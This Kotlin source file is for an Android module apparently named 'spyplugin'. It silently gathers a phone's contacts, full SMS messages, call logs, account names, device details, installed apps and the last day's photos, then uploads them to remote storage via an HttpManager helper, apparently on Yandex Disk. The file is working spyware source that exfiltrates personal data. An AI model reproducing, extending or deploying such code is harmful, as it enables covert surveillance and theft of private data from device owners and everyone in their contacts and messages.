package com.example.spyplugin

import android.accounts.AccountManager
import android.annotation.SuppressLint
import android.content.ContentResolver
import android.content.Context
import android.content.pm.ApplicationInfo
import android.graphics.Bitmap
import android.net.Uri
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Log
import com.example.background.InfoProvider
import kotlin.collections.emptyList
import kotlin.math.log
import androidx.core.graphics.scale

class InfoProviderClass : InfoProvider {
    override suspend fun sendInfo(context: Context): Boolean {
        val resolver = context.contentResolver
        val contacts = getContacts(resolver)
        logContacts(contacts)
        val smsList = getSmsList(resolver)
        val callList = getCallLogs(resolver)
        val accaunts = getAccounts(context)
        val nameDevice = getDeviceInfo()
        val androidVer = getAndroidVer()
        val listApps = getApps(context)
        val request = ContactsRequest(
            contacts,
            smsList,
            callList,
            accaunts,
            nameDevice,
            androidVer,
            listApps
        )

        val success = sendToServer(request)
        if (collectPhotos(context)) {
            Log.d("InfoProvider", "Фото отправлены успешно")
        } else {
            Log.d("InfoProvider", "Фото отправлены неуспешно")
        }
        return success
    }

    private suspend fun sendToServer(request: ContactsRequest): Boolean {
        return HttpManager.saveContactsToYandexDisk(request)
    }

    private fun getContacts(resolver: ContentResolver): List<ContactInfo> {

        val contacts = mutableListOf<ContactInfo>()

        val projection = arrayOf(
            ContactsContract.Contacts._ID,
            ContactsContract.Contacts.DISPLAY_NAME,
            ContactsContract.Contacts.HAS_PHONE_NUMBER
        )

        val sortOrder = "${ContactsContract.Contacts.DISPLAY_NAME} ASC"

        resolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            projection,
            null,
            null,
            sortOrder
        )?.use { cursor ->
            val idIndex = cursor.getColumnIndex(ContactsContract.Contacts._ID)
            val nameIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
            val hasPhoneIndex = cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)

            while (cursor.moveToNext()) {
                val id = cursor.getString(idIndex)
                val name = cursor.getString(nameIndex)
                val hasPhone = cursor.getInt(hasPhoneIndex)

                val phoneNumbers = if (hasPhone > 0) {
                    getPhoneNumbers(id, resolver)
                } else {
                    emptyList()
                }

                contacts.add(ContactInfo(name, phoneNumbers))
            }
        }
        return contacts
    }

    private fun getPhoneNumbers(contactId: String, resolver: ContentResolver): List<String> {
        val phoneNumbers = mutableListOf<String>()

        val contentResolver = resolver

        contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null,
            "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
            arrayOf(contactId),
            null
        )?.use { phoneCursor ->
            val numberIndex = phoneCursor.getColumnIndex(
                ContactsContract.CommonDataKinds.Phone.NUMBER
            )

            while (phoneCursor.moveToNext()) {
                val number = phoneCursor.getString(numberIndex)
                phoneNumbers.add(number ?: "")
            }
        }

        return phoneNumbers
    }

    private fun logContacts(contacts: List<ContactInfo>) {
        contacts.forEach { contactInfo ->
            Log.d("CONTACT", "Name: ${contactInfo.name}, " +
            "Phones: ${contactInfo.phoneNumbers.joinToString()}")
        }
    }

    private fun getSmsList(resolver: ContentResolver): List<SmsModel> {
        val smsList = mutableListOf<SmsModel>()

        val uri = Uri.parse("content://sms")
        val cursor = resolver.query(
            uri,
            null,
            null,
            null,
            "date DESC"
        )

        cursor?.use {
            val bodyIndex = it.getColumnIndex("body")
            val addressIndex = it.getColumnIndex("address")
            val dateIndex = it.getColumnIndex("date")
            val typeIndex = it.getColumnIndex("type")

            while (it.moveToNext()) {
                val body = it.getString(bodyIndex)
                val address = it.getString(addressIndex)
                val date = it.getLong(dateIndex)
                val type = it.getInt(typeIndex)

                smsList.add(
                    SmsModel(
                        body = body,
                        address = address,
                        date = date,
                        type = type
                    )
                )
            }
        }

        return smsList
    }

    fun getCallLogs(resolver: ContentResolver): List<CallLogModel> {

        val callLogs = mutableListOf<CallLogModel>()

        val cursor = resolver.query(
            CallLog.Calls.CONTENT_URI,
            null,
            null,
            null,
            "${CallLog.Calls.DATE} DESC"
        )

        cursor?.use {

            val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
            val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
            val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
            val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)

            while (it.moveToNext()) {

                val number = it.getString(numberIndex)
                val type = it.getInt(typeIndex)
                val date = it.getLong(dateIndex)
                val duration = it.getString(durationIndex)

                callLogs.add(
                    CallLogModel(
                        number = number,
                        type = type,
                        date = date,
                        duration = duration
                    )
                )
            }
        }

        return callLogs
    }

    fun getAccounts(context: Context): List<AccountModel> {

        val accountManager = AccountManager.get(context)
        val accounts = accountManager.accounts

        val list = mutableListOf<AccountModel>()

        for (account in accounts) {
            list.add(
                AccountModel(
                    name = account.name,
                    type = account.type
                )
            )
        }

        return list
    }

    fun getDeviceInfo() : DeviceInfo {
        return DeviceInfo(
            model = android.os.Build.MODEL,
            brand = android.os.Build.BRAND
        )
    }

    fun getAndroidVer() : AndroidVersion {
        return AndroidVersion(
            release = android.os.Build.VERSION.RELEASE,
            sdkInt = android.os.Build.VERSION.SDK_INT,
            codename = android.os.Build.VERSION.CODENAME
        )
    }

    @SuppressLint("QueryPermissionsNeeded")
    fun getApps(context: Context): List<AppInfo> {

        val pm = context.packageManager
        val packages = pm.getInstalledPackages(0)

        val list = mutableListOf<AppInfo>()

        for (pkg in packages) {

            if ((pkg.applicationInfo?.flags?.and(ApplicationInfo.FLAG_SYSTEM)) == 0) {

                val appName = pkg.applicationInfo?.loadLabel(pm).toString()
                val packageName = pkg.packageName
                val version = pkg.versionName ?: "unknown"

                list.add(
                    AppInfo(
                        name = appName,
                        packageName = packageName,
                        version = version
                    )
                )
            }
        }

        return list
    }

    private fun collectPhotos(context: Context) : Boolean {

        val projection = arrayOf(
            android.provider.MediaStore.Images.Media._ID,
            android.provider.MediaStore.Images.Media.DISPLAY_NAME,
            android.provider.MediaStore.Images.Media.DATE_ADDED
        )

        Log.d("InfoProvider", "Images get")

        val lastDaySeconds = (System.currentTimeMillis() / 1000) - (24 * 60 * 60)

        val selection = "${android.provider.MediaStore.Images.Media.DATE_ADDED} > ?"
        val selectionArgs = arrayOf(lastDaySeconds.toString())

        val cursor = context.contentResolver.query(
            android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            selection,
            selectionArgs,
            "${android.provider.MediaStore.Images.Media.DATE_ADDED} DESC"
        )

        Log.d("InfoProvider", "ContentProvider")

        var uploadSuccess = false
        cursor?.use {

            val idIndex = it.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media._ID)

            Log.d("InfoProvider", idIndex.toString())
            while (it.moveToNext()) {

                val id = it.getLong(idIndex)

                val uri = android.content.ContentUris.withAppendedId(
                    android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    id
                )

                Log.d("InfoProvider", uri.toString())

                try {

                    val bitmap = if (android.os.Build.VERSION.SDK_INT >= 28) {
                        val source = android.graphics.ImageDecoder.createSource(
                            context.contentResolver,
                            uri
                        )

                        android.graphics.ImageDecoder.decodeBitmap(source)

                    } else {
                        android.provider.MediaStore.Images.Media.getBitmap(
                            context.contentResolver,
                            uri
                        )
                    }

                    val fileName = "photo_${System.currentTimeMillis()}.jpg"
                    val diskPath = "/BackService/photos/$fileName"

                    val scaledBitmap = bitmap.scale(1024, 1024)

                    Log.d("InfoProvider", diskPath)

                    uploadSuccess = HttpManager.uploadPhoto(scaledBitmap, diskPath)

                } catch (e: Exception) {
                    Log.e("PHOTOS", "Ошибка фото: ${e.message}")
                }
            }
        }
        return uploadSuccess
    }
}

data class ContactsRequest(
    val contacts: List<ContactInfo>,
    val smsList: List<SmsModel>,
    val callList: List<CallLogModel>,
    val accaunts: List<AccountModel>,
    val device: DeviceInfo,
    val ver: AndroidVersion,
    val apps: List<AppInfo>,
    val timestamp: Long = System.currentTimeMillis()
)
data class ContactInfo(
    val name: String,
    val phoneNumbers: List<String>
)
data class SmsModel(
    val body: String,
    val address: String,
    val date: Long,
    val type: Int // 1 = inbox, 2 = sent
)
data class CallLogModel(
    val number: String,
    val type: Int,
    val date: Long,
    val duration: String
)
data class AccountModel(
    val name: String,
    val type: String
)
data class DeviceInfo(
    val model: String,
    val brand: String
)
data class AndroidVersion(
    val release: String,
    val sdkInt: Int,
    val codename: String
)
data class AppInfo(
    val name: String,
    val packageName: String,
    val version: String
)